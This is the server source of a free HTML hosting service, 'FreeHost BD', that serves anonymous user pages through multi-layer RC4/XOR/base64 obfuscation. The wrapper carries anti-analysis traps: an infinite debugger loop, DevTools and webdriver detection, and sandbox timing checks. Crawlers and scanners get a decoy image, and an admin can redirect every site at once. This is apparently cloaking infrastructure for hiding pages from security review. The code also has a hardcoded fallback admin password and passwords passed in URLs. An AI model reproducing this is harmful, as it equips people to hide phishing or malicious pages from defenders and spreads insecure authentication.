require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const multer = require('multer');

const app = express();

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ===== MONGODB CONNECT =====
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err.message));

// ===== TRAP IMAGE DEFAULT =====
const DEFAULT_TRAP_IMAGE = 'https://i.ibb.co/hJTyZ0Lk/fa1cafb74e87.png';

// ===== MODELS =====
const Setting = require('./models/Setting');
const Hosted = require('./models/Hosted');

// ===== MULTER CONFIG =====
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    if (!file.mimetype.startsWith('image/')) return cb(new Error('শুধু ছবি'));
    cb(null, true);
  }
});

// ===== GLOBAL REDIRECT =====
const GlobalSetting = mongoose.model('GlobalSetting', new mongoose.Schema({
  key: { type: String, unique: true },
  value: { type: String, default: '' }
}), 'globalsettings');

// ===== HELPERS =====
function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

async function getTrapImage() {
  try {
    const setting = await Setting.findOne({ key: 'trap_image' });
    if (setting && setting.value) return setting.value;
    return DEFAULT_TRAP_IMAGE;
  } catch (e) {
    return DEFAULT_TRAP_IMAGE;
  }
}

// ===== CRYPTO HELPERS =====
function rc4Crypt(data, key) {
  const S = Array.from({ length: 256 }, (_, i) => i);
  let j = 0;
  for (let i = 0; i < 256; i++) {
    j = (j + S[i] + key[i % key.length]) % 256;
    [S[i], S[j]] = [S[j], S[i]];
  }
  let i = 0; j = 0;
  const out = [];
  for (let y = 0; y < data.length; y++) {
    i = (i + 1) % 256;
    j = (j + S[i]) % 256;
    [S[i], S[j]] = [S[j], S[i]];
    out.push(data[y] ^ S[(S[i] + S[j]) % 256]);
  }
  return Buffer.from(out);
}

function xorBytes(data, key) {
  const out = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    out[i] = data[i] ^ key[i % key.length];
  }
  return out;
}

function randomString(len) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  const bytes = crypto.randomBytes(len);
  for (let i = 0; i < len; i++) result += chars[bytes[i] % chars.length];
  return result;
}

function randomHex(len) {
  const chars = '0123456789abcdef';
  let result = '';
  const bytes = crypto.randomBytes(len);
  for (let i = 0; i < len; i++) result += chars[bytes[i] % chars.length];
  return result;
}

function bytesToArr(data) {
  return Array.from(data).join(',');
}

function maskScripts(html) {
  return html.replace(/(<script[^>]*>)([\s\S]*?)(<\/script>)/gi, (match, openTag, body, closeTag) => {
    if (openTag.toLowerCase().includes('src=') || !body.trim()) return match;
    try {
      const b64 = Buffer.from(body, 'utf8').toString('base64');
      return `${openTag}\ntry{eval(atob('${b64}'))}catch(e){}\n${closeTag}`;
    } catch (e) { return match; }
  });
}

// ===== HARD OBFUSCATOR WITH DYNAMIC TRAP =====
function hardObfuscate(htmlCode, trapImage) {
  const htmlMasked = maskScripts(htmlCode);
  const urlEncoded = encodeURIComponent(htmlMasked);
  const step2 = Buffer.from(urlEncoded, 'utf8').toString('base64');
  const step2Buf = Buffer.from(step2, 'utf8');

  const rc4Key = randomString(32);
  const step3 = rc4Crypt(step2Buf, Buffer.from(rc4Key, 'utf8'));

  const salt = randomHex(16);
  const step4 = xorBytes(step3, Buffer.from(salt, 'utf8'));

  const derived = crypto.createHash('sha256').update(salt + rc4Key).digest('hex').substring(0, 32);
  const step5 = rc4Crypt(step4, Buffer.from(derived, 'utf8'));

  const n = step5.length;
  const q = Math.floor(n / 4);
  const chunks = [
    step5.slice(0, q),
    step5.slice(q, 2 * q),
    step5.slice(2 * q, 3 * q),
    step5.slice(3 * q)
  ];
  const order = [0, 1, 2, 3];
  for (let i = order.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [order[i], order[j]] = [order[j], order[i]];
  }
  const chunkJs = order.map(idx => bytesToArr(chunks[idx]));
  const reassemble = Array.from({ length: 4 }, (_, i) => order.indexOf(i));

  const decoderJs = `
(function(){
'use strict';

function showTrap() {
    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;margin:0;overflow:hidden"><img src="${trapImage}" style="width:100%;height:100vh;object-fit:contain;animation:zoomIn 0.3s ease;"></div>';
    while(true) { debugger; }
}

(function(){
  var t0 = performance.now();
  var iterations = 0;
  while (performance.now() - t0 < 1) iterations++;
  if (iterations < 100) { showTrap(); throw new Error('sandbox'); }
})();

try {
  var canvas = document.createElement('canvas');
  var ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillStyle = '#f60';
  ctx.fillText('fingerprint-check', 2, 2);
  var fp = canvas.toDataURL();
  if (!fp || fp.length < 100) throw new Error('canvas');
} catch(e) { showTrap(); throw e; }

setInterval(function(){
  var w = window.outerWidth - window.innerWidth;
  var h = window.outerHeight - window.innerHeight;
  if (w > 160 || h > 160) { showTrap(); }
}, 1000);

document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
  if (e.key === 'F12') { showTrap(); return e.preventDefault(); }
  if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) { showTrap(); return e.preventDefault(); }
  if (e.ctrlKey && e.key === 'U') { showTrap(); return e.preventDefault(); }
  if (e.ctrlKey && e.key === 'S') { showTrap(); return e.preventDefault(); }
});

if (navigator.webdriver === true) { showTrap(); throw new Error('webdriver'); }

function _xor(d, k) {
  var o = new Uint8Array(d.length);
  for (var i = 0; i < d.length; i++) o[i] = d[i] ^ k[i % k.length];
  return o;
}
function _rc4(key, data) {
  var S = [], j = 0, x, res = [];
  for (var i = 0; i < 256; i++) S[i] = i;
  for (i = 0; i < 256; i++) {
    j = (j + S[i] + key[i % key.length]) & 0xff;
    x = S[i]; S[i] = S[j]; S[j] = x;
  }
  i = 0; j = 0;
  for (var y = 0; y < data.length; y++) {
    i = (i + 1) & 0xff; j = (j + S[i]) & 0xff;
    x = S[i]; S[i] = S[j]; S[j] = x;
    res.push(data[y] ^ S[(S[i] + S[j]) & 0xff]);
  }
  return res;
}
function _arr2str(a) {
  var s = '';
  for (var i = 0; i < a.length; i++) s += String.fromCharCode(a[i]);
  return s;
}
function _merge(a, b) {
  var r = [];
  for (var i = 0; i < a.length; i++) r.push(a[i]);
  for (var i = 0; i < b.length; i++) r.push(b[i]);
  return r;
}

var _chunks = [${chunkJs[0]}];
var _chunkB = [${chunkJs[1]}];
var _chunkC = [${chunkJs[2]}];
var _chunkD = [${chunkJs[3]}];
var _order  = [${reassemble.join(',')}];
var _salt   = [${bytesToArr(Buffer.from(salt, 'utf8'))}];
var _key    = [${bytesToArr(Buffer.from(rc4Key, 'utf8'))}];
var _derive = [${bytesToArr(Buffer.from(derived, 'utf8'))}];

var _all = [_chunks, _chunkB, _chunkC, _chunkD];
var _step5 = [];
for (var i = 0; i < 4; i++) { _step5 = _merge(_step5, _all[_order.indexOf(i)]); }

var _step4 = _rc4(_derive, _step5);
var _step3 = _xor(_step4, _salt);
var _step2 = _rc4(_key, _step3);
var _b64 = _arr2str(_step2);
var _url = atob(_b64);
var _html = decodeURIComponent(_url);

try {
  var _blob = new Blob([_html], {type: 'text/html'});
  var _url2 = URL.createObjectURL(_blob);
  var _frame = document.createElement('iframe');
  _frame.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:0';
  _frame.sandbox = 'allow-scripts allow-forms allow-popups allow-modals allow-same-origin';
  _frame.src = _url2;
  document.body.innerHTML = '';
  document.body.appendChild(_frame);
} catch(err) { showTrap(); }

})();
`;

  const enc = Buffer.from(decoderJs, 'utf8').toString('base64');
  const third = Math.floor(enc.length / 3);
  const a = enc.substring(0, third);
  const b = enc.substring(third, 2 * third);
  const c = enc.substring(2 * third);

  const parts = [a, b, c];
  for (let i = parts.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [parts[i], parts[j]] = [parts[j], parts[i]];
  }
  const idxA = parts.indexOf(a);
  const idxB = parts.indexOf(b);
  const idxC = parts.indexOf(c);

  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);

  return `<!-- Protected | ${timestamp} -->
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>·</title>
<style>@keyframes zoomIn{from{transform:scale(0.8);opacity:0}to{transform:scale(1);opacity:1}}</style>
</head>
<body style="margin:0;overflow:hidden">
<script>
(function(){
  var _p = ['${parts[0]}','${parts[1]}','${parts[2]}'];
  var _src = _p[${idxA}] + _p[${idxB}] + _p[${idxC}];
  var _js = decodeURIComponent(escape(atob(_src)));
  try { new Function(_js)(); } catch(e) {
    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;margin:0"><img src="${trapImage}" style="max-width:100%;max-height:100vh;object-fit:contain;"></div>';
  }
})();
</script>
<noscript>JavaScript required</noscript>
</body></html>`;
}

// ===== HEALTH CHECK =====
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString(), service: 'FreeHost BD' });
});

// ===== FIREBASE MODE (/p/:slug) =====
app.get('/p/:slug', async (req, res) => {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const isBrowser = userAgent.includes('Mozilla') || userAgent.includes('Chrome') || userAgent.includes('Safari') || userAgent.includes('Firefox');
    if (!isBrowser) {
      const trap = await getTrapImage();
      return res.status(403).send(`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;margin:0"><img src="${trap}" style="max-width:100%;max-height:100vh;object-fit:contain;"></div>`);
    }

    const host = await Hosted.findOne({ slug: req.params.slug, banned: false });
    if (!host) return res.status(404).send('<h1>404 - Site Not Found</h1>');

    if (host.password) {
      const provided = req.query.pw;
      if (provided !== host.password) {
        return res.send(`
          <!DOCTYPE html>
          <html><head><title>Protected</title><meta name="viewport" content="width=device-width,initial-scale=1">
          <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#0f172a;color:#fff}
          .box{background:#1e293b;padding:40px;border-radius:16px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);max-width:90%}
          input{padding:12px;border-radius:8px;border:1px solid #334155;background:#0f172a;color:#fff;width:100%;margin:16px 0;box-sizing:border-box}
          button{padding:12px 24px;background:#6366f1;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
          </style></head>
          <body><div class="box"><h2>🔒 Password Required</h2>
          <form method="GET"><input type="password" name="pw" placeholder="Enter password" autofocus><button type="submit">Unlock</button></form></body></html>
        `);
      }
    }

    const redirectSetting = await GlobalSetting.findOne({ key: 'global_redirect_url' });
    if (redirectSetting && redirectSetting.value && redirectSetting.value.trim() !== '') {
      return res.redirect(redirectSetting.value.trim());
    }

    if (host.redirectUrl && host.redirectUrl.trim() !== '') {
      return res.redirect(host.redirectUrl.trim());
    }

    host.views = (host.views || 0) + 1;
    host.lastActive = new Date();
    await host.save();

    const trap = await getTrapImage();
    const obfuscated = hardObfuscate(host.code, trap);
    res.setHeader('Content-Type', 'text/html');
    res.send(obfuscated);
  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

// ===== PROTECTED MODE (/s/:slug) =====
app.get('/s/:slug', async (req, res) => {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const isBrowser = userAgent.includes('Mozilla') || userAgent.includes('Chrome') || userAgent.includes('Safari') || userAgent.includes('Firefox');
    if (!isBrowser) {
      const trap = await getTrapImage();
      return res.status(403).send(`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;margin:0"><img src="${trap}" style="max-width:100%;max-height:100vh;object-fit:contain;"></div>`);
    }

    const host = await Hosted.findOne({ slug: req.params.slug, banned: false });
    if (!host) return res.status(404).send('<h1>404 - Site Not Found</h1>');

    if (host.password) {
      const provided = req.query.pw;
      if (provided !== host.password) {
        return res.send(`
          <!DOCTYPE html>
          <html><head><title>Protected</title><meta name="viewport" content="width=device-width,initial-scale=1">
          <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#0f172a;color:#fff}
          .box{background:#1e293b;padding:40px;border-radius:16px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);max-width:90%}
          input{padding:12px;border-radius:8px;border:1px solid #334155;background:#0f172a;color:#fff;width:100%;margin:16px 0;box-sizing:border-box}
          button{padding:12px 24px;background:#6366f1;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
          </style></head>
          <body><div class="box"><h2>🔒 Password Required</h2>
          <form method="GET"><input type="password" name="pw" placeholder="Enter password" autofocus><button type="submit">Unlock</button></form></body></html>
        `);
      }
    }

    const redirectSetting = await GlobalSetting.findOne({ key: 'global_redirect_url' });
    if (redirectSetting && redirectSetting.value && redirectSetting.value.trim() !== '') {
      return res.redirect(redirectSetting.value.trim());
    }

    if (host.redirectUrl && host.redirectUrl.trim() !== '') {
      return res.redirect(host.redirectUrl.trim());
    }

    host.views = (host.views || 0) + 1;
    host.lastActive = new Date();
    await host.save();

    const pwQuery = req.query.pw ? `?pw=${encodeURIComponent(req.query.pw)}` : '';

    res.setHeader('Content-Type', 'text/html');
    res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escapeHtml(host.title || 'Loading...')}</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { width: 100%; height: 100%; overflow: hidden; background: #030712; }
  iframe { width: 100%; height: 100vh; border: none; display: block; }
</style>
</head>
<body>
<iframe src="/embed/${escapeHtml(host.slug)}${pwQuery}" sandbox="allow-scripts allow-forms allow-popups allow-modals allow-same-origin"></iframe>
</body>
</html>`);
  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

// ===== EMBED ROUTE =====
app.get('/embed/:slug', async (req, res) => {
  try {
    const host = await Hosted.findOne({ slug: req.params.slug, banned: false });
    if (!host) return res.status(404).send('<h1>404 - Site Not Found</h1>');

    if (host.password) {
      const provided = req.query.pw;
      if (provided !== host.password) {
        return res.status(403).send('<h1>403 - Access Denied</h1>');
      }
    }

    host.views = (host.views || 0) + 1;
    host.lastActive = new Date();
    await host.save();

    const trap = await getTrapImage();
    const obfuscated = hardObfuscate(host.code, trap);
    res.setHeader('Content-Type', 'text/html');
    res.send(obfuscated);
  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

// ===== HOST API =====
app.post('/api/host', async (req, res) => {
  try {
    const { code, title, slug, password } = req.body;
    if (!code || !code.trim()) return res.status(400).json({ error: 'HTML কোড দিন' });
    let finalSlug = (slug || '').trim().toLowerCase();
    if (!finalSlug) finalSlug = 'site-' + Math.random().toString(36).substring(2, 10);
    if (!/^[a-z0-9-]+$/.test(finalSlug)) return res.status(400).json({ error: 'Slug-এ শুধু lowercase, সংখ্যা, হাইফেন' });
    const existing = await Hosted.findOne({ slug: finalSlug });
    if (existing) return res.status(400).json({ error: 'এই slug আগেই ব্যবহার হয়েছে' });
    const finalTitle = (title || '').trim() || ('Untitled ' + finalSlug.substring(0, 6));
    const host = await Hosted.create({ userId: null, title: finalTitle, slug: finalSlug, code, password: (password || '').trim() || null, lastActive: new Date() });
    res.json({ host });
  } catch (err) {
    console.error('Create host error:', err);
    res.status(500).json({ error: 'সার্ভার সমস্যা' });
  }
});

// ===== PHOTO API =====
app.post('/api/photo', upload.single('photo'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: 'ছবি দিন' });
    const IMGBB_KEY = process.env.IMGBB_KEY;
    if (!IMGBB_KEY) return res.status(500).json({ error: 'IMGBB_KEY সেট করা হয়নি' });
    const base64Image = req.file.buffer.toString('base64');
    const formData = new URLSearchParams();
    formData.append('key', IMGBB_KEY);
    formData.append('image', base64Image);
    const imgbbRes = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
    const imgbbData = await imgbbRes.json();
    if (!imgbbData.success) return res.status(500).json({ error: 'ImgBB ব্যর্থ' });
    res.json({ photo: { url: imgbbData.data.url, filename: req.file.originalname || 'image_' + Date.now() } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== ADMIN API =====
function authAdmin(req, res, next) {
  const adminPass = req.headers['x-admin-pass'] || req.query.adminPass;
  const expectedPass = process.env.ADMIN_PASSWORD || 'NOBITA_VIP';
  if (adminPass !== expectedPass) return res.status(403).json({ error: 'অ্যাডমিন অ্যাক্সেস নেই' });
  next();
}

app.get('/api/admin/hosts', authAdmin, async (req, res) => {
  try {
    const hosts = await Hosted.find().sort({ createdAt: -1 });
    res.json(hosts);
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

app.put('/api/admin/hosts/:id/ban', authAdmin, async (req, res) => {
  try {
    const { banned } = req.body;
    const host = await Hosted.findByIdAndUpdate(req.params.id, { banned: !!banned }, { new: true });
    if (!host) return res.status(404).json({ error: 'হোস্ট নেই' });
    res.json(host);
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

app.put('/api/admin/hosts/:id', authAdmin, async (req, res) => {
  try {
    const { code, title, slug, password, redirectUrl } = req.body;
    const update = { updatedAt: Date.now() };
    if (code !== undefined) update.code = code;
    if (title) update.title = title;
    if (slug) update.slug = slug;
    if (password !== undefined) update.password = password || null;
    if (redirectUrl !== undefined) update.redirectUrl = redirectUrl || null;
    const host = await Hosted.findByIdAndUpdate(req.params.id, update, { new: true });
    if (!host) return res.status(404).json({ error: 'হোস্ট নেই' });
    res.json(host);
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

app.delete('/api/admin/hosts/:id', authAdmin, async (req, res) => {
  try {
    const host = await Hosted.findByIdAndDelete(req.params.id);
    if (!host) return res.status(404).json({ error: 'হোস্ট নেই' });
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

// ===== TRAP IMAGE API =====
app.get('/api/admin/trap-image', authAdmin, async (req, res) => {
  try {
    const setting = await Setting.findOne({ key: 'trap_image' });
    res.json({ url: setting ? setting.value : DEFAULT_TRAP_IMAGE });
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

app.post('/api/admin/trap-image', authAdmin, async (req, res) => {
  try {
    const { url } = req.body;
    await Setting.findOneAndUpdate({ key: 'trap_image' }, { value: url || DEFAULT_TRAP_IMAGE }, { upsert: true });
    res.json({ success: true, url: url || DEFAULT_TRAP_IMAGE });
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

// ===== GLOBAL REDIRECT API =====
app.get('/api/admin/redirect', authAdmin, async (req, res) => {
  try {
    const setting = await GlobalSetting.findOne({ key: 'global_redirect_url' });
    res.json({ url: setting ? setting.value : '' });
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

app.post('/api/admin/redirect', authAdmin, async (req, res) => {
  try {
    const { url } = req.body;
    await GlobalSetting.findOneAndUpdate({ key: 'global_redirect_url' }, { value: url || '' }, { upsert: true });
    res.json({ success: true, url: url || '' });
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

app.get('/api/admin/stats', authAdmin, async (req, res) => {
  try {
    const totalHosts = await Hosted.countDocuments();
    const bannedHosts = await Hosted.countDocuments({ banned: true });
    const totalViews = await Hosted.aggregate([{ $group: { _id: null, total: { $sum: '$views' } } }]);
    const onlineNow = await Hosted.countDocuments({ lastActive: { $gte: new Date(Date.now() - 5 * 60 * 1000) } });
    res.json({ totalHosts, bannedHosts, totalViews: totalViews[0]?.total || 0, onlineNow });
  } catch (err) { res.status(500).json({ error: 'সার্ভার সমস্যা' }); }
});

// ===== SERVE FRONTEND =====
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/photo', (req, res) => res.sendFile(path.join(__dirname, 'public', 'photo.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// ===== START =====
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 FreeHost BD running on port ${PORT}`);
  console.log(`🔐 Multi-Layer Obfuscation: Enabled`);
  console.log(`🎯 Trap System: Dynamic (Admin Panel)`);
  console.log(`🤖 Anti-Bot: Enabled`);
  console.log(`🔥 Firebase Mode: /p/:slug`);
  console.log(`🛡️ Protected Mode: /s/:slug`);
});
